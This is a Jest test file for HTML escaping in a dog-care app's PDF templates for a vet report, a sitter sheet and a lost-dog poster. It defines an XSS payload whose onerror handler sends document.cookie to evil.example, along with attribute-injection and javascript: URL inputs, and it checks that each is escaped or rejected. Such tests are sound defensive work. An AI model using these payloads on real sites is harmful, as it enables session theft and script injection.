/**
 * @jest-environment node
 */
import { esc, imageSource } from '../escape';
import { posterPdf, sitterPdf, vetPdf } from '../templates';
import type { PdfDog, PosterPdfData, SitterPdfData, VetPdfData } from '../types';

const HOSTILE = `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">`;
const PHOTO = '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAEBAQ==';
const common = { footer: 'Erstellt am 22. September 2026.', fonts: null };

const dog = (name = 'Bäri'): PdfDog => ({
  name,
  subtitle: 'Whippet, Rüde, 5 Jahre',
  facts: [{ label: 'Chipnummer', value: '756 0981 2345 6789' }],
  photo: PHOTO,
});

const vet = (overrides: Partial<VetPdfData> = {}): VetPdfData => ({
  dog: dog(),
  medications: [{ name: 'Apoquel 16 mg', detail: 'halbe Tablette, 08:00 und 18:00' }],
  health: [
    {
      kind: 'Entwurmung',
      date: '25. Juni 2026',
      product: 'Milbemax',
      next: '25. September 2026',
      due: false,
    },
  ],
  weights: [{ date: '22. September 2026', weight: '13.8 kg', difference: '+0.6 kg' }],
  weightCurve: null,
  diaryPeriod: 'Vom 1. bis 22. September 2026',
  diary: [{ when: '20. September, 08:00', category: 'Appetit', text: 'Wenig.', photos: [PHOTO] }],
  ...overrides,
});

const sitter = (overrides: Partial<SitterPdfData> = {}): SitterPdfData => ({
  dog: dog(),
  food: '2 × täglich 120 g',
  medications: [],
  care: 'Scheu bei Fremden: nicht rufen und nicht nachrennen.',
  allergies: null,
  vet: [{ label: 'Praxis', value: 'Tierarztpraxis am Bach' }],
  owner: [],
  ...overrides,
});

const poster = (overrides: Partial<PosterPdfData> = {}): PosterPdfData => ({
  name: 'Bäri',
  photo: PHOTO,
  description: ['Whippet, Rüde', 'rehbraun gestromt'],
  chip: '756 0981 2345 6789',
  lastSeen: 'Littau, am 22. September 2026 um 18:00',
  phone: '000 000 00 00',
  ...overrides,
});

const all = (name: string) => [
  vetPdf(vet({ dog: dog(name) }), common),
  sitterPdf(sitter({ dog: dog(name), care: name }), common),
  posterPdf(poster({ name, lastSeen: name, phone: name }), common),
];

/** Jede Schriftgrösse, die das HTML setzt, in Punkt. */
function fontSizes(html: string): number[] {
  return [...html.matchAll(/font-size:\s*([\d.]+)pt/g)].map((match) => Number(match[1]));
}

describe('PDF-Vorlagen', () => {
  it.each(['vet', 'sitter', 'poster'] as const)(
    'zeigt feindselige Eingaben als Text (%s)',
    (kind) => {
      const html = all(HOSTILE)[['vet', 'sitter', 'poster'].indexOf(kind)] ?? '';
      expect(html).not.toContain('<img src=x');
      expect(html).not.toContain('onerror="');
      expect(html).toContain('&lt;img src=x onerror=&quot;fetch(');
    },
  );

  it('enthält keine einzige Adresse nach aussen', () => {
    for (const html of all(HOSTILE)) {
      // Die feindselige Adresse steht nur maskiert als Text, nie als Attribut.
      expect(html).not.toMatch(/(src|href)\s*=\s*["']?\s*(https?:|\/\/)/i);
      expect(html).not.toMatch(/url\(\s*["']?\s*(https?:|\/\/)/i);
      expect(html).not.toMatch(/<(script|iframe|link|object|embed)\b/i);
    }
  });

  it('gestaltet nur über Klassen, weil die Web-Vorschau style-Attribute sperrt', () => {
    for (const html of all('Bäri')) {
      expect(html).not.toMatch(/\sstyle\s*=/i);
    }
  });

  it('setzt A4 ausdrücklich und nichts unter 12 pt', () => {
    for (const html of all('Bäri')) {
      expect(html).toContain('size: 595pt 842pt');
      expect(Math.min(...fontSizes(html))).toBeGreaterThanOrEqual(12);
    }
  });

  it('zeigt Halterangaben nur, wenn welche eingetragen sind', () => {
    expect(sitterPdf(sitter(), common)).not.toContain('So erreichst du mich');
    const withOwner = sitterPdf(
      sitter({ owner: [{ label: 'Telefon', value: '000 000 00 00' }] }),
      common,
    );
    expect(withOwner).toContain('So erreichst du mich');
  });

  it('bettet Fotos nur als JPEG ein', () => {
    expect(vetPdf(vet(), common)).toContain(`src="data:image/jpeg;base64,${PHOTO}"`);
    const broken = vetPdf(vet({ dog: { ...dog(), photo: '" onload="alert(1)' } }), common);
    expect(broken).not.toContain('onload');
  });

  it('druckt acht Abreissstreifen mit der Nummer', () => {
    const html = posterPdf(poster(), common);
    expect(html.match(/<strong>000 000 00 00<\/strong><br>Bäri vermisst/g)).toHaveLength(8);
  });
});

describe('Maskieren', () => {
  it('ersetzt alle Zeichen, die HTML bedeuten', () => {
    expect(esc(`<a href="x">'&'</a>`)).toBe(
      '&lt;a href=&quot;x&quot;&gt;&#39;&amp;&#39;&lt;/a&gt;',
    );
    expect(esc(null)).toBe('');
  });

  it('lässt als Bild nur Base64 zu', () => {
    expect(imageSource(PHOTO)).toBe(`data:image/jpeg;base64,${PHOTO}`);
    expect(imageSource('javascript:alert(1)')).toBeNull();
    expect(imageSource('https://evil.example/x.jpg')).toBeNull();
    expect(imageSource('')).toBeNull();
  });
});
